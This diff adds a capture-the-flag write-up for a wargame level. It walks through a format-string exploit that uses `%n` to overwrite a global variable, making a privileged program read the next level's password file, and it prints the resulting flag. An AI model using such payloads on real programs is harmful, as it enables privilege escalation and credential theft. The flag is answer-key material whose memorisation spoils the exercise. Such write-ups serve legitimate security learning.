@@ -1,0 +1,29 @@
+Same as previous level
+find `m` address with gdb
+
+> info variables
+> ...
+> 0x08049810 m
+> ...
+
+We need to overwrite its value to 0x1025544
+Find the buffer's stack position
+
+> (python -c 'print "AAAA " + "%x " * 12') | ./level4
+> AAAA b7ff26b0 bffff664 b7fd0ff4 0 0 bffff628 804848d bffff420 200 b7fd1ac0 b7ff37d0 41414141
+
+We observe that it is at the 12th position
+
+We replace the first bytes by the address of `m` in reverse order and prepare the `%n` formatter with the 12th position
+
+> (python -c 'print "\x08\x04\x98\x10"[::-1] + "%12$n"') | ./level4
+
+As we decompile our asm code to C we can see the `m` value being compared to a value `0x1025544` (16930116)
+This is our width we want, minus the 4 bytes we already wrote, so 16930112.
+
+> (python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112x" + "%12$n"') | ./level4
+
+It then prints our flag as the command is executed with the process owner rights.
+
+> system("/bin/cat /home/user/level5/.pass");
+> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
